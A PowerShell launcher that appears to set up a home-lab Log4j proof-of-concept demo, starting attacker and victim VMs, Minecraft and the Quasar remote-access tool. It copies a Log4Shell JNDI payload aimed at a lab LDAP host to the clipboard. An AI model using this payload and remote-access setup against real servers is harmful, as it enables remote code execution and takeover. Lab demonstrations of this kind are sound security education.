$response = Read-Host "STARTING ALL LOG4J RELATED PROCESSES - ARE YOU SURE? (make sure RasPi is ready!!!)"
if ($response -ne "y")
{
    exit
}
cd 'C:\Users\minds\Code\Log4J POC\scripts'
echo "enabling connection sharing..."
Set-Ics -PublicConnectionName 'VirtualBox Ethernet' -PrivateConnectionName 'Real Ethernet'
echo "starting attacker..."
& '.\RESTART KALI.ps1'
cd 'C:\Users\minds\Desktop\Log4J POC\scripts'
echo "starting victim..."
& '.\RESTART VICTIM.ps1'
echo "starting Minecraft..."
Start-Process -FilePath 'C:\Program Files (x86)\Minecraft Launcher\MinecraftLauncher.exe'
echo "copying command..."
Set-Clipboard -Value '${jndi:ldap://192.168.56.101:1389/Log4jRCE}'
echo "starting Quasar..."
Start-Process -FilePath 'C:\Users\minds\Code\Log4J POC\Quasar\Quasar Admin.exe'
echo "Setting display mode to Duplicate..."
displayswitch.exe /clone
echo "ALL DONE"